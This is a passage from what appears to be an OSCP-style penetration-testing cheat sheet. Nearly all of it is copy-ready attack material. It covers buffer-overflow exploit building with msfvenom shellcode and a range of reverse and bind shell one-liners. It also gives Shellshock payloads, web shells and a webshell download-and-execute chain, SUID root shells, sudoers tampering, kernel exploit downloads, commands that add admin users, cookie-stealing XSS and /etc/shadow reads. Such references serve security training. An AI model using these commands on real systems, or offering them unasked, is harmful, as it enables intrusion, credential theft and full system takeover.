-   DEP and ASLR - Data Execution Prevention (DEP) and Address Space
    Layout Randomization (ASLR)


-   Nmap Fuzzers:

    -   NMap Fuzzer List  
        [https://nmap.org/nsedoc/categories/fuzzer.html](https://nmap.org/nsedoc/categories/fuzzer.html)

    -   NMap HTTP Form Fuzzer  
        nmap --script http-form-fuzzer --script-args
        'http-form-fuzzer.targets={1={path=/},2={path=/register.html}}'
        -p 80 $ip

    -   Nmap DNS Fuzzer  
        nmap --script dns-fuzz --script-args timelimit=2h $ip -d

-   MSFvenom  
    [*https://www.offensive-security.com/metasploit-unleashed/msfvenom/*](https://www.offensive-security.com/metasploit-unleashed/msfvenom/)

-   Windows Buffer Overflows

    -   Controlling EIP
    
             locate pattern_create
             pattern_create.rb -l 2700
             locate pattern_offset
             pattern_offset.rb -q 39694438

    -   Verify exact location of EIP - [\*] Exact match at offset 2606

            buffer = "A" \* 2606 + "B" \* 4 + "C" \* 90

    -   Check for “Bad Characters” - Run multiple times 0x00 - 0xFF

    -   Use Mona to determine a module that is unprotected

    -   Bypass DEP if present by finding a Memory Location with Read and Execute access for JMP ESP

    -   Use NASM to determine the HEX code for a JMP ESP instruction

            /usr/share/metasploit-framework/tools/exploit/nasm_shell.rb

            JMP ESP  
            00000000 FFE4 jmp esp

    -   Run Mona in immunity log window to find (FFE4) XEF command

            !mona find -s "\xff\xe4" -m slmfc.dll  
            found at 0x5f4a358f - Flip around for little endian format
            buffer = "A" * 2606 + "\x8f\x35\x4a\x5f" + "C" * 390

    -   MSFVenom to create payload
    
            msfvenom -p windows/shell_reverse_tcp LHOST=$ip LPORT=443 -f c –e x86/shikata_ga_nai -b "\x00\x0a\x0d"

    -   Final Payload with NOP slide  
    
            buffer="A"*2606 + "\x8f\x35\x4a\x5f" + "\x90" * 8 + shellcode

    -   Create a PE Reverse Shell  
        msfvenom -p windows/shell\_reverse\_tcp LHOST=$ip LPORT=4444
        -f  
        exe -o shell\_reverse.exe

    -   Create a PE Reverse Shell and Encode 9 times with
        Shikata\_ga\_nai  
        msfvenom -p windows/shell\_reverse\_tcp LHOST=$ip LPORT=4444
        -f  
        exe -e x86/shikata\_ga\_nai -i 9 -o
        shell\_reverse\_msf\_encoded.exe

    -   Create a PE reverse shell and embed it into an existing
        executable  
        msfvenom -p windows/shell\_reverse\_tcp LHOST=$ip LPORT=4444 -f
        exe -e x86/shikata\_ga\_nai -i 9 -x
        /usr/share/windows-binaries/plink.exe -o
        shell\_reverse\_msf\_encoded\_embedded.exe

    -   Create a PE Reverse HTTPS shell  
        msfvenom -p windows/meterpreter/reverse\_https LHOST=$ip
        LPORT=443 -f exe -o met\_https\_reverse.exe

-   Linux Buffer Overflows

    -   Run Evans Debugger against an app  
        edb --run /usr/games/crossfire/bin/crossfire

    -   ESP register points toward the end of our CBuffer  
        add eax,12  
        jmp eax  
        83C00C add eax,byte +0xc  
        FFE0 jmp eax

    -   Check for “Bad Characters” Process of elimination - Run multiple
        times 0x00 - 0xFF

    -   Find JMP ESP address  
        "\\x97\\x45\\x13\\x08" \# Found at Address 08134597

    -   crash = "\\x41" \* 4368 + "\\x97\\x45\\x13\\x08" +
        "\\x83\\xc0\\x0c\\xff\\xe0\\x90\\x90"

    -   msfvenom -p linux/x86/shell\_bind\_tcp LPORT=4444 -f c -b
        "\\x00\\x0a\\x0d\\x20" –e x86/shikata\_ga\_nai

    -   Connect to the shell with netcat:  
        nc -v $ip 4444
        
Shells
===================================================================================================================================

-   Netcat Shell Listener  

    `nc -nlvp 4444`

-   Spawning a TTY Shell - Break out of Jail or limited shell
         You should almost always upgrade your shell after taking control of an apache or www user.
         
        (For example when you encounter an error message when trying to run an exploit sh: no job control in this shell )
        
        (hint: sudo -l to see what you can run)
        
     -   You may encounter limited shells that use rbash and only allow you to execute a single command per session.
         You can overcome this by executing an SSH shell to your localhost:
         
               ssh user@$ip nc $localip 4444 -e /bin/sh
               enter user's password
               python -c 'import pty; pty.spawn("/bin/sh")'
               export TERM=linux
         
      `python -c 'import pty; pty.spawn("/bin/sh")'`

               python -c 'import socket,subprocess,os;s=socket.socket(socket.AF\_INET,socket.SOCK\_STREAM);          s.connect(("$ip",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(\["/bin/sh","-i"\]);'

      `echo os.system('/bin/bash')`

      `/bin/sh -i`

      `perl —e 'exec "/bin/sh";'`

      perl: `exec "/bin/sh";`

      ruby: `exec "/bin/sh"`

      lua: `os.execute('/bin/sh')`

      From within IRB: `exec "/bin/sh"`


      From within vi: `:!bash`
     or
     
      `:set shell=/bin/bash:shell`
     
      From within vim `':!bash':`

      From within nmap: `!sh`

      From within tcpdump
      
         echo $’id\\n/bin/netcat $ip 443 –e /bin/bash’ > /tmp/.test chmod +x /tmp/.test sudo tcpdump –ln –I eth- -w /dev/null –W 1 –G 1 –z /tmp/.tst –Z root

      From busybox  `/bin/busybox telnetd -|/bin/sh -p9999`

-   Pen test monkey PHP reverse shell  
    [http://pentestmonkey.net/tools/web-shells/php-reverse-shel](http://pentestmonkey.net/tools/web-shells/php-reverse-shell)

-   php-findsock-shell - turns PHP port 80 into an interactive shell  
    [http://pentestmonkey.net/tools/web-shells/php-findsock-shell](http://pentestmonkey.net/tools/web-shells/php-findsock-shell)

-   Perl Reverse Shell  
    [http://pentestmonkey.net/tools/web-shells/perl-reverse-shell](http://pentestmonkey.net/tools/web-shells/perl-reverse-shell)

-   PHP powered web browser Shell b374k with file upload etc.  
    [https://github.com/b374k/b374k](https://github.com/b374k/b374k)

-   Windows reverse shell - PowerSploit’s Invoke-Shellcode script and inject a Meterpreter shell 
    https://github.com/PowerShellMafia/PowerSploit/blob/master/CodeExecution/Invoke-Shellcode.ps1
    
-   Web Backdoors from Fuzzdb 
    https://github.com/fuzzdb-project/fuzzdb/tree/master/web-backdoors

-   Creating Meterpreter Shells with MSFVenom - http://www.securityunlocked.com/2016/01/02/network-security-pentesting/most-useful-msfvenom-payloads/
      
      *Linux*
      
      `msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f elf > shell.elf`
      
      *Windows*
      
      `msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f exe > shell.exe`
      
      *Mac*

      `msfvenom -p osx/x86/shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f macho > shell.macho`
      
      **Web Payloads**
      
      *PHP*
      
      `msfvenom -p php/reverse_php LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.php`
      
      OR
      
      `msfvenom -p php/meterpreter_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.php`
      
      Then we need to add the <?php at the first line of the file so that it will execute as a PHP webpage:
      
      `cat shell.php | pbcopy && echo '<?php ' | tr -d '\n' > shell.php && pbpaste >> shell.php`
      
      *ASP*

      `msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f asp > shell.asp`
      
      *JSP*

      `msfvenom -p java/jsp_shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.jsp`
      
      *WAR*

      `msfvenom -p java/jsp_shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f war > shell.war`
      
      **Scripting Payloads**
      
      *Python*

      `msfvenom -p cmd/unix/reverse_python LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.py`
      
      *Bash*

      `msfvenom -p cmd/unix/reverse_bash LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.sh`
      
      *Perl*

      `msfvenom -p cmd/unix/reverse_perl LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.pl`
      
      **Shellcode**
      
      For all shellcode see ‘msfvenom –help-formats’ for information as to valid parameters. Msfvenom will output code that is able to be cut and pasted in this language for your exploits.

      *Linux Based Shellcode*

      `msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f <language>`
      
      *Windows Based Shellcode*

      `msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f <language>`
      
      *Mac Based Shellcode*

      `msfvenom -p osx/x86/shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f <language>`

      **Handlers**
      Metasploit handlers can be great at quickly setting up Metasploit to be in a position to receive your incoming shells. Handlers should be in the following format.

         use exploit/multi/handler
         set PAYLOAD <Payload name>
         set LHOST <LHOST value>
         set LPORT <LPORT value>
         set ExitOnSession false
         exploit -j -z
      
      Once the required values are completed the following command will execute your handler – ‘msfconsole -L -r ‘

-   SSH to Meterpreter: https://daemonchild.com/2015/08/10/got-ssh-creds-want-meterpreter-try-this/

         use auxiliary/scanner/ssh/ssh_login
         use post/multi/manage/shell_to_meterpreter

-   Shellshock

    -   Testing for shell shock with NMap
    
    `root@kali:~/Documents# nmap -sV -p 80 --script http-shellshock --script-args uri=/cgi-bin/admin.cgi $ip`

    -   git clone https://github.com/nccgroup/shocker

    `./shocker.py -H TARGET --command "/bin/cat /etc/passwd" -c /cgi-bin/status --verbose`

    -   Shell Shock SSH Forced Command  
        Check for forced command by enabling all debug output with ssh  
        
              ssh -vvv  
              ssh -i noob noob@$ip '() { :;}; /bin/bash'

    -   cat file (view file contents)  
    
              echo -e "HEAD /cgi-bin/status HTTP/1.1\\r\\nUser-Agent: () {:;}; echo \\$(</etc/passwd)\\r\\nHost:vulnerable\\r\\nConnection: close\\r\\n\\r\\n" | nc TARGET 80

    -   Shell Shock run bind shell  
    
             echo -e "HEAD /cgi-bin/status HTTP/1.1\\r\\nUser-Agent: () {:;}; /usr/bin/nc -l -p 9999 -e /bin/sh\\r\\nHost:vulnerable\\r\\nConnection: close\\r\\n\\r\\n" | nc TARGET 80

File Transfers
============================================================================================================

-   Post exploitation refers to the actions performed by an attacker,
    once some level of control has been gained on his target.

-   Simple Local Web Servers

    -   Run a basic http server, great for serving up shells etc  
        python -m SimpleHTTPServer 80

    -   Run a basic Python3 http server, great for serving up shells
        etc  
        python3 -m http.server

    -   Run a ruby webrick basic http server  
        ruby -rwebrick -e "WEBrick::HTTPServer.new  
        (:Port => 80, :DocumentRoot => Dir.pwd).start"

    -   Run a basic PHP http server  
        php -S $ip:80

-   Creating a wget VB Script on Windows:  
    [*https://github.com/erik1o6/oscp/blob/master/wget-vbs-win.txt*](https://github.com/erik1o6/oscp/blob/master/wget-vbs-win.txt)

-   Windows file transfer script that can be pasted to the command line.  File transfers to a Windows machine can be tricky without a Meterpreter shell.  The following script can be copied and pasted into a basic windows reverse and used to transfer files from a web server (the timeout 1 commands are required after each new line):

         echo Set args = Wscript.Arguments  >> webdl.vbs
         timeout 1
         echo Url = "http://1.1.1.1/windows-privesc-check2.exe"  >> webdl.vbs
         timeout 1
         echo dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP")  >> webdl.vbs
         timeout 1
         echo dim bStrm: Set bStrm = createobject("Adodb.Stream")  >> webdl.vbs
         timeout 1
         echo xHttp.Open "GET", Url, False  >> webdl.vbs
         timeout 1
         echo xHttp.Send  >> webdl.vbs
         timeout 1
         echo with bStrm      >> webdl.vbs
         timeout 1
         echo 	.type = 1 '      >> webdl.vbs
         timeout 1
         echo 	.open      >> webdl.vbs
         timeout 1
         echo 	.write xHttp.responseBody      >> webdl.vbs
         timeout 1
         echo 	.savetofile "C:\temp\windows-privesc-check2.exe", 2 '  >> webdl.vbs
         timeout 1
         echo end with >> webdl.vbs
         timeout 1
         echo

      The file can be run using the following syntax:
      
      `C:\temp\cscript.exe webdl.vbs`
      
-   Mounting File Shares

    -   Mount NFS share to /mnt/nfs  
        mount $ip:/vol/share /mnt/nfs

-   HTTP Put  
    nmap -p80 $ip --script http-put --script-args
    http-put.url='/test/sicpwn.php',http-put.file='/var/www/html/sicpwn.php

-   Uploading Files
    -------------------------------------------------------------------------------------------------------------

    -   SCP
    
        scp username1@source_host:directory1/filename1 username2@destination_host:directory2/filename2
        
        scp localfile username@$ip:~/Folder/
        
        scp Linux_Exploit_Suggester.pl bob@192.168.1.10:~
        

    -   Webdav with Davtest- Some sysadmins are kind enough to enable the PUT method - This tool will auto upload a backdoor
    
        `davtest -move -sendbd auto -url http://$ip`
      
        https://github.com/cldrn/davtest
        
        You can also upload a file using the PUT method with the curl command:
        
        `curl -T 'leetshellz.txt' 'http://$ip'`
        
        And rename it to an executable file using the MOVE method with the curl command:

        `curl -X MOVE --header 'Destination:http://$ip/leetshellz.php' 'http://$ip/leetshellz.txt'`

    -   Upload shell using limited php shell cmd  
        use the webshell to download and execute the meterpreter  
        \[curl -s --data "cmd=wget http://174.0.42.42:8000/dhn -O
        /tmp/evil" http://$ip/files/sh.php  
        \[curl -s --data "cmd=chmod 777 /tmp/evil"
        http://$ip/files/sh.php  
        curl -s --data "cmd=bash -c /tmp/evil" http://$ip/files/sh.php

    -   TFTP  
        mkdir /tftp  
        atftpd --daemon --port 69 /tftp  
        cp /usr/share/windows-binaries/nc.exe /tftp/  
        EX. FROM WINDOWS HOST:  
        C:\\Users\\Offsec>tftp -i $ip get nc.exe

    -   FTP  
        apt-get update && apt-get install pure-ftpd  
          
        \#!/bin/bash  
        groupadd ftpgroup  
        useradd -g ftpgroup -d /dev/null -s /etc ftpuser  
        pure-pw useradd offsec -u ftpuser -d /ftphome  
        pure-pw mkdb  
        cd /etc/pure-ftpd/auth/  
        ln -s ../conf/PureDB 60pdb  
        mkdir -p /ftphome  
        chown -R ftpuser:ftpgroup /ftphome/  
          
        /etc/init.d/pure-ftpd restart

-   Packing Files
    -------------------------------------------------------------------------------------------------------------

    -   Ultimate Packer for eXecutables  
        upx -9 nc.exe

    -   exe2bat - Converts EXE to a text file that can be copied and
        pasted  
        locate exe2bat  
        wine exe2bat.exe nc.exe nc.txt

    -   Veil - Evasion Framework -
        https://github.com/Veil-Framework/Veil-Evasion  
        apt-get -y install git  
        git clone https://github.com/Veil-Framework/Veil-Evasion.git  
        cd Veil-Evasion/  
        cd setup  
        setup.sh -c

Privilege Escalation
==================================================================================================================

*Password reuse is your friend.  The OSCP labs are true to life, in the way that the users will reuse passwords across different services and even different boxes. Maintain a list of cracked passwords and test them on new machines you encounter.*


-   Linux Privilege Escalation
    ------------------------------------------------------------------------------------------------------------------------

-   Defacto Linux Privilege Escalation Guide  - A much more through guide for linux enumeration:
    [https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)

-   Try the obvious - Maybe the user can sudo to root:  
    
    `sudo su`
    
-   Here are the commands I have learned to use to perform linux enumeration and privledge escalation:

    What services are running as root?:
    
    `ps aux | grep root`
    
    What files run as root / SUID / GUID?:

         find / -perm +2000 -user root -type f -print
         find / -perm -1000 -type d 2>/dev/null   # Sticky bit - Only the owner of the directory or the owner of a file can delete or rename here.
         find / -perm -g=s -type f 2>/dev/null    # SGID (chmod 2000) - run as the group, not the user who started it.
         find / -perm -u=s -type f 2>/dev/null    # SUID (chmod 4000) - run as the owner, not the user who started it.
         find / -perm -g=s -o -perm -u=s -type f 2>/dev/null    # SGID or SUID
         for i in `locate -r "bin$"`; do find $i \( -perm -4000 -o -perm -2000 \) -type f 2>/dev/null; done  
         find / -perm -g=s -o -perm -4000 ! -type l -maxdepth 3 -exec ls -ld {} \; 2>/dev/null

    What folders are world writeable?:
    
         find / -writable -type d 2>/dev/null      # world-writeable folders
         find / -perm -222 -type d 2>/dev/null     # world-writeable folders
         find / -perm -o w -type d 2>/dev/null     # world-writeable folders
         find / -perm -o x -type d 2>/dev/null     # world-executable folders
         find / \( -perm -o w -perm -o x \) -type d 2>/dev/null   # world-writeable & executable folders
    
-   There are a few scripts that can automate the linux enumeration process:

      - Google is my favorite Linux Kernel exploitation search tool.  Many of these automated checkers are missing important kernel exploits which can create a very frustrating blindspot during your OSCP course.

      - LinuxPrivChecker.py - My favorite automated linux priv enumeration checker - 
      
         [https://www.securitysift.com/download/linuxprivchecker.py](https://www.securitysift.com/download/linuxprivchecker.py)

      - LinEnum - (Recently Updated)
      
      [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)
      
      - linux-exploit-suggester (Recently Updated)
      
      [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)
      
      -   Highon.coffee Linux Local Enum - Great enumeration script!
      
          `wget https://highon.coffee/downloads/linux-local-enum.sh`

      -   Linux Privilege Exploit Suggester  (Old has not been updated in years)
      
    [https://github.com/PenturaLabs/Linux\_Exploit\_Suggester](https://github.com/PenturaLabs/Linux_Exploit_Suggester)

      -   Linux post exploitation enumeration and exploit checking tools  
      
    [https://github.com/reider-roque/linpostexp](https://github.com/reider-roque/linpostexp)
    

Handy Kernel Exploits

-   CVE-2010-2959 - 'CAN BCM' Privilege Escalation - Linux Kernel < 2.6.36-rc1 (Ubuntu 10.04 / 2.6.32)

    [https://www.exploit-db.com/exploits/14814/](https://www.exploit-db.com/exploits/14814/)
    
         wget -O i-can-haz-modharden.c http://www.exploit-db.com/download/14814
         $ gcc i-can-haz-modharden.c -o i-can-haz-modharden
         $ ./i-can-haz-modharden
         [+] launching root shell!
         # id
         uid=0(root) gid=0(root)

-   CVE-2010-3904 - Linux RDS Exploit - Linux Kernel <= 2.6.36-rc8  
    [https://www.exploit-db.com/exploits/15285/](https://www.exploit-db.com/exploits/15285/)

-   CVE-2012-0056 - Mempodipper - Linux Kernel 2.6.39 < 3.2.2 (Gentoo / Ubuntu x86/x64)  
    [https://git.zx2c4.com/CVE-2012-0056/about/](https://git.zx2c4.com/CVE-2012-0056/about/)  
    Linux CVE 2012-0056  
    
          wget -O exploit.c http://www.exploit-db.com/download/18411 
          gcc -o mempodipper exploit.c  
          ./mempodipper

-   CVE-2016-5195 - Dirty Cow - Linux Privilege Escalation - Linux Kernel <= 3.19.0-73.8  
    [https://dirtycow.ninja/](https://dirtycow.ninja/)  
    First existed on 2.6.22 (released in 2007) and was fixed on Oct 18, 2016  

-   Run a command as a user other than root  

          sudo -u haxzor /usr/bin/vim /etc/apache2/sites-available/000-default.conf

-   Add a user or change a password

          /usr/sbin/useradd -p 'openssl passwd -1 thePassword' haxzor  
          echo thePassword | passwd haxzor --stdin

-   Local Privilege Escalation Exploit in Linux

    -   **SUID** (**S**et owner **U**ser **ID** up on execution)  
        Often SUID C binary files are required to spawn a shell as a
        superuser, you can update the UID / GID and shell as required.  
          
        below are some quick copy and paste examples for various
        shells:  
     
              SUID C Shell for /bin/bash  

              int main(void){  
              setresuid(0, 0, 0);  
              system("/bin/bash");  
              }  

              SUID C Shell for /bin/sh  

              int main(void){  
              setresuid(0, 0, 0);  
              system("/bin/sh");  
              }  

              Building the SUID Shell binary  
              gcc -o suid suid.c  
              For 32 bit:  
              gcc -m32 -o suid suid.c

    -   Create and compile an SUID from a limited shell (no file transfer)  
        
              echo "int main(void){\nsetgid(0);\nsetuid(0);\nsystem(\"/bin/sh\");\n}" >privsc.c  
              gcc privsc.c -o privsc

-   Handy command if you can get a root user to run it. Add the www-data user to Root SUDO group with no password requirement:

    `echo 'chmod 777 /etc/sudoers && echo "www-data ALL=NOPASSWD:ALL" >> /etc/sudoers && chmod 440 /etc/sudoers' > /tmp/update`
    
-   You may find a command is being executed by the root user, you may be able to modify the system PATH environment variable
    to execute your command instead.  In the example below, ssh is replaced with a reverse shell SUID connecting to 10.10.10.1 on 
    port 4444.
    
         set PATH="/tmp:/usr/local/bin:/usr/bin:/bin"
         echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.1 4444 >/tmp/f" >> /tmp/ssh
         chmod +x ssh

-   SearchSploit  

              searchsploit –uncsearchsploit apache 2.2  
              searchsploit "Linux Kernel"  
              searchsploit linux 2.6 | grep -i ubuntu | grep local  
              searchsploit slmail

 -   Kernel Exploit Suggestions for Kernel Version 3.0.0  
 
     `./usr/share/linux-exploit-suggester/Linux_Exploit_Suggester.pl -k 3.0.0`

-   Precompiled Linux Kernel Exploits  - ***Super handy if GCC is not installed on the target machine!***

    [*https://www.kernel-exploits.com/*](https://www.kernel-exploits.com/)    

-   Collect root password

    `cat /etc/shadow |grep root`
    
-   Find and display the proof.txt or flag.txt - LOOT!

            cat `find / -name proof.txt -print`

-   Windows Privilege Escalation
    --------------------------------------------------------------------------------------------------------------------------

-   Windows Privilege Escalation resource
    http://www.fuzzysecurity.com/tutorials/16.html

-   Try the getsystem command using meterpreter - rarely works but is worth a try.

    `meterpreter > getsystem`

-   Metasploit Meterpreter Privilege Escalation Guide
    https://www.offensive-security.com/metasploit-unleashed/privilege-escalation/

-   Windows Server 2003 and IIS 6.0 WEBDAV Exploiting
http://www.r00tsec.com/2011/09/exploiting-microsoft-iis-version-60.html

         msfvenom -p windows/meterpreter/reverse_tcp LHOST=1.2.3.4 LPORT=443 -f asp > aspshell.txt

         cadavar http://$ip
         dav:/> put aspshell.txt
         Uploading aspshell.txt to `/aspshell.txt':
         Progress: [=============================>] 100.0% of 38468 bytes succeeded.
         dav:/> copy aspshell.txt aspshell3.asp;.txt
         Copying `/aspshell3.txt' to `/aspshell3.asp%3b.txt':  succeeded.
         dav:/> exit

         msf > use exploit/multi/handler
         msf exploit(handler) > set payload windows/meterpreter/reverse_tcp
         msf exploit(handler) > set LHOST 1.2.3.4
         msf exploit(handler) > set LPORT 80
         msf exploit(handler) > set ExitOnSession false
         msf exploit(handler) > exploit -j

         curl http://$ip/aspshell3.asp;.txt

         [*] Started reverse TCP handler on 1.2.3.4:443 
         [*] Starting the payload handler...
         [*] Sending stage (957487 bytes) to 1.2.3.5
         [*] Meterpreter session 1 opened (1.2.3.4:443 -> 1.2.3.5:1063) at 2017-09-25 13:10:55 -0700

-   Windows privledge escalation exploits are often written in Python. So, it is necessary to compile the using pyinstaller.py into an executable and upload them to the remote server.

         pip install pyinstaller
         wget -O exploit.py http://www.exploit-db.com/download/31853  
         python pyinstaller.py --onefile exploit.py

-   Windows Server 2003 and IIS 6.0 privledge escalation using impersonation: 

      https://www.exploit-db.com/exploits/6705/
   
      https://github.com/Re4son/Churrasco
      
         c:\Inetpub>churrasco
         churrasco
         /churrasco/-->Usage: Churrasco.exe [-d] "command to run"

         c:\Inetpub>churrasco -d "net user /add <username> <password>"
         c:\Inetpub>churrasco -d "net localgroup administrators <username> /add"
         c:\Inetpub>churrasco -d "NET LOCALGROUP "Remote Desktop Users" <username> /ADD"

-   Windows MS11-080 - http://www.exploit-db.com/exploits/18176/  
    
          python pyinstaller.py --onefile ms11-080.py  
          mx11-080.exe -O XP
    
-   Powershell Exploits - You may find that some Windows privledge escalation exploits are written in Powershell. You may not have an interactive shell that allows you to enter the powershell prompt.  Once the powershell script is uploaded to the server, here is a quick one liner to run a powershell command from a basic (cmd.exe) shell:

      MS16-032 https://www.exploit-db.com/exploits/39719/
      
      `powershell -ExecutionPolicy ByPass -command "& { . C:\Users\Public\Invoke-MS16-032.ps1; Invoke-MS16-032 }"`
      
    
-   Powershell Priv Escalation Tools
    https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc

-   Windows Run As - Switching users in linux is trival with the `SU` command.  However, an equivalent command does not exist in Windows.  Here are 3 ways to run a command as a different user in Windows.

      -   Sysinternals psexec is a handy tool for running a command on a remote or local server as a specific user, given you have thier username and password. The following example creates a reverse shell from a windows server to our Kali box using netcat for Windows and Psexec (on a 64 bit system).

               C:\>psexec64 \\COMPUTERNAME -u Test -p test -h "c:\users\public\nc.exe -nc 192.168.1.10 4444 -e cmd.exe" 

               PsExec v2.2 - Execute processes remotely
               Copyright (C) 2001-2016 Mark Russinovich
               Sysinternals - www.sysinternals.com

      -   Runas.exe is a handy windows tool that allows you to run a program as another user so long as you know thier password. The following example creates a reverse shell from a windows server to our Kali box using netcat for Windows and Runas.exe:

               C:\>C:\Windows\System32\runas.exe /env /noprofile /user:Test "c:\users\public\nc.exe -nc 192.168.1.10 4444 -e cmd.exe"
               Enter the password for Test:
               Attempting to start nc.exe as user "COMPUTERNAME\Test" ...

      -   PowerShell can also be used to launch a process as another user. The following simple powershell script will run a reverse shell as the specified username and password.

               $username = '<username here>'
               $password = '<password here>'
               $securePassword = ConvertTo-SecureString $password -AsPlainText -Force
               $credential = New-Object System.Management.Automation.PSCredential $username, $securePassword
               Start-Process -FilePath C:\Users\Public\nc.exe -NoNewWindow -Credential $credential -ArgumentList ("-nc","192.168.1.10","4444","-e","cmd.exe") -WorkingDirectory C:\Users\Public

             Next run this script using powershell.exe:

             `powershell -ExecutionPolicy ByPass -command "& { . C:\Users\public\PowerShellRunAs.ps1; }"`


-   Windows Service Configuration Viewer - Check for misconfigurations
    in services that can lead to privilege escalation. You can replace
    the executable with your own and have windows execute whatever code
    you want as the privileged user.  
    icacls scsiaccess.exe

         scsiaccess.exe  
         NT AUTHORITY\SYSTEM:(I)(F)  
         BUILTIN\Administrators:(I)(F)  
         BUILTIN\Users:(I)(RX)  
         APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(I)(RX)  
         Everyone:(I)(F)

-   Compile a custom add user command in windows using C  

             root@kali:~\# cat useradd.c  
             #include <stdlib.h> /* system, NULL, EXIT_FAILURE */  
             int main ()  
             {  
             int i;  
             i=system ("net localgroup administrators low /add");  
             return 0;  
             }  

             i686-w64-mingw32-gcc -o scsiaccess.exe useradd.c

-   Group Policy Preferences (GPP)  
    A common useful misconfiguration found in modern domain environments
    is unprotected Windows GPP settings files

    -   map the Domain controller SYSVOL share  
        
        `net use z:\\dc01\SYSVOL`

    -   Find the GPP file: Groups.xml  
        
        `dir /s Groups.xml`

    -   Review the contents for passwords  
        
        `type Groups.xml`

    -   Decrypt using GPP Decrypt  
        
        `gpp-decrypt riBZpPtHOGtVk+SdLOmJ6xiNgFH6Gp45BoP3I6AnPgZ1IfxtgI67qqZfgh78kBZB`
        
-   Find and display the proof.txt or flag.txt - get the loot!
    
    `#meterpreter  >     run  post/windows/gather/win_privs`
    `cd\ & dir /b /s proof.txt`
    `type c:\pathto\proof.txt`
    

Client, Web and Password Attacks
==============================================================================================================================

-   <span id="_pcjm0n4oppqx" class="anchor"><span id="_Toc480741817" class="anchor"></span></span>Client Attacks
    ------------------------------------------------------------------------------------------------------------

    -   MS12-037- Internet Explorer 8 Fixed Col Span ID  
        wget -O exploit.html
        <http://www.exploit-db.com/download/24017>  
        service apache2 start

    -   JAVA Signed Jar client side attack  
        echo '<applet width="1" height="1" id="Java Secure"
        code="Java.class" archive="SignedJava.jar"><param name="1"
        value="http://$ip:80/evil.exe"></applet>' >
        /var/www/html/java.html  
        User must hit run on the popup that occurs.

    -   Linux Client Shells  
        [*http://www.lanmaster53.com/2011/05/7-linux-shells-using-built-in-tools/*](http://www.lanmaster53.com/2011/05/7-linux-shells-using-built-in-tools/)

    -   Setting up the Client Side Exploit

    -   Swapping Out the Shellcode

    -   Injecting a Backdoor Shell into Plink.exe  
        backdoor-factory -f /usr/share/windows-binaries/plink.exe -H $ip
        -P 4444 -s reverse\_shell\_tcp

-   <span id="_n6fr3j21cp1m" class="anchor"><span id="_Toc480741818" class="anchor"></span></span>Web Attacks
    ---------------------------------------------------------------------------------------------------------

    -   Web Shag Web Application Vulnerability Assessment Platform  
        webshag-gui

    -   Web Shells  
        [*http://tools.kali.org/maintaining-access/webshells*](http://tools.kali.org/maintaining-access/webshells)  
        ls -l /usr/share/webshells/

    -   Generate a PHP backdoor (generate) protected with the given
        password (s3cr3t)  
        weevely generate s3cr3t  
        weevely http://$ip/weevely.php s3cr3t

    -   Java Signed Applet Attack

    -   HTTP / HTTPS Webserver Enumeration

        -   OWASP Dirbuster

        -   nikto -h $ip

    -   Essential Iceweasel Add-ons  
        Cookies Manager
        https://addons.mozilla.org/en-US/firefox/addon/cookies-manager-plus/  
        Tamper Data  
        https://addons.mozilla.org/en-US/firefox/addon/tamper-data/

    -   Cross Site Scripting (XSS)  
        significant impacts, such as cookie stealing and authentication
        bypass, redirecting the victim’s browser to a malicious HTML
        page, and more

    -   Browser Redirection and IFRAME Injection  
        <iframe SRC="http://$ip/report" height = "0" width
        ="0"></iframe>

    -   Stealing Cookies and Session Information  
        <script>  
        new
        image().src="http://$ip/bogus.php?output="+document.cookie;  
        </script>  
        nc -nlvp 80

-   File Inclusion Vulnerabilities 
    -----------------------------------------------------------------------------------------------------------------------------

    -   Local (LFI) and remote (RFI) file inclusion vulnerabilities are
        commonly found in poorly written PHP code.

    -   fimap - There is a Python tool called fimap which can be
        leveraged to automate the exploitation of LFI/RFI
        vulnerabilities that are found in PHP (sqlmap for LFI):  
        [*https://github.com/kurobeats/fimap*](https://github.com/kurobeats/fimap)

        -   Gaining a shell from phpinfo()  
            fimap + phpinfo() Exploit - If a phpinfo() file is present,
            it’s usually possible to get a shell, if you don’t know the
            location of the phpinfo file fimap can probe for it, or you
            could use a tool like OWASP DirBuster.

    -   For Local File Inclusions look for the include() function in PHP
        code.  
        include("lang/".$\_COOKIE\['lang'\]);  
        include($\_GET\['page'\].".php");

    -   LFI - Encode and Decode a file using base64  
        curl -s
        http://$ip/?page=php://filter/convert.base64-encode/resource=index
        | grep -e '\[^\\ \]\\{40,\\}' | base64 -d

    -   LFI - Download file with base 64 encoding  
        [*http://$ip/index.php?page=php://filter/convert.base64-encode/resource=admin.php*](about:blank)

    -   LFI Linux Files:  
        /etc/issue  
        /proc/version  
        /etc/profile  
        /etc/passwd  
        /etc/passwd  
        /etc/shadow  
        /root/.bash\_history  
        /var/log/dmessage  
        /var/mail/root  
